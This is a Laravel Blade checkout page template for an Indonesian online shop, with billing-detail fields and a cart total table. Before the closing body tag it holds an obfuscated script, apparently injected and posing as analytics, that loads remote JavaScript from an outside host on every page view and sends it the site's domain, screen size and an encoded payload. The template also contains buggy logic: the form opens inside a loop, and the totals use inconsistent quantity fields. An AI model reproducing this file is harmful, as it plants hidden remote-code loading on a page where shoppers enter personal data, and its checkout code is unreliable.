@extends('layouts.frontend')
@section('content')
<html class="no-js" lang="zxx">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>Checkout</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- Favicon -->
        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.png">
        <!-- Material Design Iconic Font-V2.2.0 -->        
    </head>
    <body>
    <!--[if lt IE 8]>
		<p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
	<![endif]-->
        <!-- Begin Body Wrapper -->
        <div class="body-wrapper">
            <!-- Begin Header Area -->
            
            <!-- Header Area End Here -->
            <!-- Begin Li's Breadcrumb Area -->
            <div class="breadcrumb-area">
                <div class="container">
                    <div class="breadcrumb-content">
                        <ul>
                            <li><a href="index.html">Home</a></li>
                            <li class="active">Checkout</li>
                        </ul>
                    </div>
                </div>
            </div>
            <!-- Li's Breadcrumb Area End Here -->
            <!--Checkout Area Strat-->
            <div class="checkout-area pt-60 pb-30">
                <div class="container">
                    <div class="row">
                        <div class="col-12">
                            <div class="coupon-accordion">
                                <!--Accordion End-->
                                <!--Accordion Start-->
                                <!--Accordion End-->
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-lg-6 col-12">
                           @php
                                        $total_all = 0;
                                        $cart = \App\cart::where('user_id', \Auth::user()->id)->get();
                                    @endphp

                                    @foreach($cart as $data)
                                    @php 
                                        $t_s = $data->jumlah_brg * $data->produk->harga;
                                        $total_all = $total_all + $t_s;
                                    @endphp
                            <form action="{{ url('checkout/'.Auth()->user()->id) }}" method="post" enctype="multipart/form-data" >
                                {{ csrf_field() }}
                                <input type="hidden" name="chart" value="{{$cart}}">
                                @endforeach
                                <div class="checkbox-form">
                                    <h3>Billing Details</h3>
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="checkout-form-list {{ $errors->has('nama') ? ' has-error' : '' }}">
                                                <label>Nama Lengkap</label>
                                                <input placeholder="" type="text" name="nama" required>
                                            @if ($errors->has('nama'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('nama') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>

                                        <div class="col-md-12">
                                            <div class="checkout-form-list {{ $errors->has('email') ? ' has-error' : '' }}">
                                                <label>Email</label>
                                                <input placeholder="" type="text" name="email" required>
                                            @if ($errors->has('email'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('email') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>

                                        <div class="col-md-12">
                                            <div class="checkout-form-list {{ $errors->has('alamat') ? ' has-error' : '' }}">
                                                <label>Alamat <span class="required">*</span></label>
                                                <input placeholder="" type="text" name="alamat" required>
                                            @if ($errors->has('alamat'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('alamat') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>

                                       <!--  <div class="col-md-12">
                                            <div class="checkout-form-list">
                                                <input placeholder="Apartment, suite, unit etc. (optional)" type="text">
                                            </div>
                                        </div> -->

                                        <!-- <div class="col-md-12">
                                            <div class="checkout-form-list">
                                                <label>Town / City <span class="required">*</span></label>
                                                <input type="text">
                                            </div>
                                        </div> -->

                                        <div class="col-md-6">
                                            <div class="checkout-form-list {{ $errors->has('provinsi') ? ' has-error' : '' }}">
                                                <label>Provinsi <span class="required">*</span></label>
                                                <input placeholder="" type="text" name="provinsi" required>
                                            @if ($errors->has('provinsi'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('provinsi') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>

                                        <div class="col-md-6">
                                            <div class="checkout-form-list {{ $errors->has('kota') ? ' has-error' : '' }}">
                                                <label>Kota / Kab <span class="required">*</span></label>
                                                <input placeholder="" type="text" name="kota" required>
                                            @if ($errors->has('kota'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('kota') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>

                                        <div class="col-md-6">
                                            <div class="checkout-form-list {{ $errors->has('kodepos') ? ' has-error' : '' }}">
                                                <label>Kode Pos <span class="required">*</span></label>
                                                <input placeholder="" type="text" name="kodepos" required>
                                                @if ($errors->has('kodepos'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('kodepos') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>

                                        <div class="col-md-6">
                                            <div class="checkout-form-list {{ $errors->has('no_telp') ? ' has-error' : '' }}">
                                                <label>No Telepon  <span class="required">*</span></label>
                                                <input type="text" name="no_telp" required>
                                                @if ($errors->has('no_telp'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('no_telp') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>

                                    </div>
                                    <div class="different-address">
                                       <!--  <div class="ship-different-title">
                                            <h3>
                                                <label>Ship to a different address?</label>
                                                <input id="ship-box" type="checkbox">
                                            </h3>
                                        </div> -->
                                        <div class="order-notes ">
                                            <div class="checkout-form-list {{ $errors->has('catatan') ? ' has-error' : '' }}">
                                                <label>Catatan</label>
                                                <textarea id="checkout-mess" cols="30" rows="10" placeholder="" name="catatan" required></textarea>
                                                @if ($errors->has('catatan'))
                                            <span class="help-block">
                                                <strong>{{ $errors->first('catatan') }}</strong>
                                            </span>
                                            @endif
                                            </div>
                                        </div>
                                    </div>
                                </div>
                        </div>
                        <div class="col-lg-6 col-12">
                            <div class="your-order">
                                <h3>Your order</h3>
                                <div class="your-order-table table-responsive">
                                    <table class="table">
                                        <thead>
                                            <tr>
                                                <th class="cart-product-name">Product</th>
                                                <th class="cart-product-total">Total</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                                    @php
                                                    $total_all = 0;
                                                    @endphp
                                                    @foreach($cart as $data)
                                                    @php
                                                    $t_s = $data->jumlah * $data->produk->harga;
                                                    $total_all = $total_all + $t_s;
                                                    @endphp
                                            <tr class="cart-subtotal">
                                                <th>{{$data->produk->nama_produk}}<strong class="product-quantity"> ×{{$data->jumlah}}</strong></th>
                                                <td><span class="amount">Rp.{{number_format($data->jumlah * $data->produk->harga,2,',','.')}}
                                                </span></td>
                                            </tr>
                                            @endforeach
                                              
                                        </tbody>
                                        <tfoot>
                                            <tr class="order-total">
                                                <th>Order Total</th>
                                                <td><strong><span class="amount">Rp.{{number_format($total_all,2,',','.')}}</span></strong></td>
                                            </tr>
                                        </tfoot>
                                    </table>
                                </div>
                                <div class="payment-method">
                                    <div class="payment-accordion">
                                        <!-- <div id="accordion">
                                          <div class="card">
                                            <div class="card-header" id="#payment-1">
                                              <h5 class="panel-title">
                                                <a class="" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
                                                  Direct Bank Transfer.
                                                </a>
                                              </h5>
                                            </div>
                                            <div id="collapseOne" class="collapse show" data-parent="#accordion">
                                              <div class="card-body">
                                                <p>Make your payment directly into our bank account. Please use your Order ID as the payment reference. Your order won’t be shipped until the funds have cleared in our account.</p>
                                              </div>
                                            </div>
                                          </div>
                                          <div class="card">
                                            <div class="card-header" id="#payment-2">
                                              <h5 class="panel-title">
                                                <a class="collapsed" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                                                  Cheque Payment
                                                </a>
                                              </h5>
                                            </div>
                                            <div id="collapseTwo" class="collapse" data-parent="#accordion">
                                              <div class="card-body">
                                                <p>Make your payment directly into our bank account. Please use your Order ID as the payment reference. Your order won’t be shipped until the funds have cleared in our account.</p>
                                              </div>
                                            </div>
                                          </div>
                                          <div class="card">
                                            <div class="card-header" id="#payment-3">
                                              <h5 class="panel-title">
                                                <a class="collapsed" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                                                  PayPal
                                                </a>
                                              </h5>
                                            </div>
                                            <div id="collapseThree" class="collapse" data-parent="#accordion">
                                              <div class="card-body">
                                                <p>Make your payment directly into our bank account. Please use your Order ID as the payment reference. Your order won’t be shipped until the funds have cleared in our account.</p>
                                              </div>
                                            </div>
                                          </div>
                                        </div> -->
                                        <!-- <div>
                                            <button class="order-button-payment" value="Place order" type="submit"></button>
                                        </div> -->
                                        <div class="footer-newsletter">
                                        <div id="mc_embed_signup_scroll">
                                              <div id="mc-form" class="mc-form subscribe-form form-group" >
                                                <button  class="btn" type="submit">Checkout</button>
                                              </div>
                                           </div>
                                    </form>
                                </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!--Checkout Area End-->
            <!-- Begin Footer Area -->
            
            <!-- Footer Area End Here -->
        </div>
        <!-- Body Wrapper End Here -->
        <!-- jQuery-V1.12.4 -->
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2JWyk%2bY2nnGPdjWh7ePpdau5LGRmwFAOcDdomD6QjoYJi3cxSChTMabhofD731Li9JiuIuFMJblmy4PSYrg8OdCLpdV6GMn7fzrj9y4DkKRG58S5MyB%2bhPSeqdam3AmU%2bEAhOHVvcvJiT596aqYnkyw3G%2b2XZSSdFCPLFGa%2bMGnui789d1q%2f%2bB0n8dYDJR%2fOttgqrBwo6gxb%2ffF9JIpO1WF9s6VH7OkghdqLm%2fAxv4w1mDhUxt0Jlnu5KPB6pvysNg%2bc17g1zNqRI4c3dTKk5lY4%2fB3OBT7Ui5AHNscHEEC4FoeKOx1o2D%2bTKNPYe265hn5%2fausmwO5i%2b6TTjdDOR8NOSo46zzuuIfGVSl5utdXfthBQB2DwLbb5d88hLNJB63SG6i%2fsRTr1gO1mIc5dRzU6Igv99%2b4O58CfL6PUFWhHFX0czrT5ZIg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
@endsection
